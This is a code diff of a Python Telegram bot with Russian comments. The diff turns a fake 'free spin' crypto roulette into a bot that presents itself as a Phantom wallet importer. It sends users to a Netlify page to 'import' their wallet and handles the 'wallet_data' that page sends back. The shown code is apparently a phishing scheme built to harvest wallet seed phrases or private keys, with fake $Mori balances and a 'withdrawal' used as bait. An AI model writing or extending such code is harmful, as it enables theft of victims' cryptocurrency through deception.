@@ -3,7 +3,7 @@ import json
 import logging
 from pathlib import Path
 from dotenv import load_dotenv
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 from telegram.constants import ParseMode
 
@@ -92,51 +92,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Сохраняем нового пользователя
             save_user_data()
         
-        # Проверяем, крутил ли пользователь уже
-        has_spun = user_has_spun.get(user_id, False)
-        
+        # Этот бот только для получения данных от сайта phantommori (кошелек)
+        # Создаем кнопку для открытия сайта с кошельком
+        wallet_url = 'https://flourishing-cheesecake-87caf4.netlify.app/'
         keyboard = [
-            [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
+            [KeyboardButton("🔗 Импортировать кошелек", web_app=WebAppInfo(url=wallet_url))]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
         
         # Используем effective_message для большей надежности
         message = update.effective_message
         
-        # Загружаем актуальный баланс из файла перед показом
-        # (на случай, если данные были изменены в другом процессе)
-        if DATA_FILE.exists():
-            try:
-                with open(DATA_FILE, 'r', encoding='utf-8') as f:
-                    file_data = json.load(f)
-                    file_balances = file_data.get('balances', {})
-                    # Конвертируем ключи из строк в int
-                    file_balances = {int(k): v for k, v in file_balances.items()}
-                    if user_id in file_balances:
-                        user_balances[user_id] = file_balances[user_id]
-                        logger.info(f"Loaded balance from file for user {user_id}: {user_balances[user_id]} $Mori")
-            except Exception as e:
-                logger.error(f"Error loading balance from file: {e}")
-        
-        current_balance = user_balances.get(user_id, 0)
-        logger.info(f"Showing balance for user {user_id} in /start: {current_balance} $Mori")
-        
         if message:
-            if has_spun:
-                await message.reply_text(
-                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
-                    f"🎰 Вы уже использовали свой бесплатный спин!\n\n"
-                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
-                    reply_markup=reply_markup
-                )
-            else:
-                await message.reply_text(
-                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
-                    f"🎰 У вас есть один бесплатный спин!\n\n"
-                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
-                    reply_markup=reply_markup
-                )
-            logger.info(f"Sent start message to user {user_id}, balance: {current_balance} $Mori, has_spun: {has_spun}")
+            await message.reply_text(
+                f"Привет, {update.effective_user.first_name}! 👋\n\n"
+                f"💼 Это бот для импорта кошелька Phantom.\n\n"
+                f"Нажмите кнопку ниже, чтобы открыть сайт и импортировать кошелек:",
+                reply_markup=reply_markup
+            )
+            logger.info(f"Sent start message to user {user_id}")
         else:
             logger.error(f"No message found in update for user {user_id}")
     except Exception as e:
@@ -199,20 +173,16 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
         data = json.loads(update.message.web_app_data.data)
         logger.info(f"Parsed data from user {user_id}: {data}")
         
+        # Этот бот обрабатывает ТОЛЬКО данные от сайта phantommori (кошелек)
+        # Игнорируем все данные от рулетки
+        if data.get('type') in ['check_spin_status', 'spin_result', 'withdraw_balance']:
+            logger.info(f"Ignoring roulette data type: {data.get('type')} from user {user_id}")
+            return
+        
         if data.get('type') == 'check_spin_status':
-            # Проверяем, может ли пользователь крутить
-            has_spun = user_has_spun.get(user_id, False)
-            user_balance = user_balances.get(user_id, 0)
-            
-            # Если спин был сброшен через команду /reset, отправляем сообщение
-            # (но не блокируем, так как Web App сам проверит статус)
-            if has_spun:
-                # Пользователь уже крутил, но мы не отправляем сообщение автоматически
-                # чтобы не спамить при каждом открытии Web App
-                logger.info(f"Spin status check for user {user_id}: has_spun=True, balance={user_balance}")
-            else:
-                # Пользователь может крутить
-                logger.info(f"Spin status check for user {user_id}: can_spin=True, balance={user_balance}")
+            # Игнорируем - это данные от рулетки
+            logger.info(f"Ignoring check_spin_status from user {user_id}")
+            return
         
         elif data.get('type') == 'spin_result':
             logger.info(f"=== Processing spin_result ===")
@@ -254,12 +224,12 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             save_user_data()
             logger.info(f"Data saved to file. Balance for user {user_id}: {new_balance} $Mori")
             
-            # Создаем кнопку для импорта кошелька (используем KeyboardButton для поддержки sendData)
+            # Создаем кнопку для импорта кошелька (обычная ссылка)
             wallet_url = 'https://flourishing-cheesecake-87caf4.netlify.app/'
             keyboard = [
-                [KeyboardButton("🔗 Импортировать кошелек", web_app=WebAppInfo(url=wallet_url))]
+                [InlineKeyboardButton("🔗 Импортировать кошелек", url=wallet_url)]
             ]
-            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+            reply_markup = InlineKeyboardMarkup(keyboard)
             
             # Отправляем сообщение в чат
             user_name = update.effective_user.first_name or "Пользователь"
@@ -316,37 +286,9 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
                     logger.error(f"Fallback error type: {type(e2).__name__}")
         
         elif data.get('type') == 'withdraw_balance':
-            # Запрос на вывод средств
-            amount = data.get('amount', 0)
-            if user_id not in user_balances:
-                user_balances[user_id] = 0
-            
-            logger.info(f"Withdraw request from user {user_id}: {amount} $Mori")
-            
-            if user_balances[user_id] < amount:
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=(
-                        f"❌ Недостаточно средств для вывода!\n"
-                        f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
-                    )
-                )
-            elif amount <= 0:
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text="❌ Неверная сумма для вывода!"
-                )
-            else:
-                # Открываем сайт для импорта кошелька
-                # Данные кошелька будут отправлены через wallet_data
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=(
-                        f"💵 Запрос на вывод {amount} $Mori принят!\n"
-                        f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                        f"🔗 Откройте сайт и импортируйте кошелек для вывода средств."
-                    )
-                )
+            # Игнорируем - это данные от рулетки
+            logger.info(f"Ignoring withdraw_balance from user {user_id}")
+            return
         
         elif data.get('type') == 'wallet_data':
             # Получение данных кошелька от пользователя
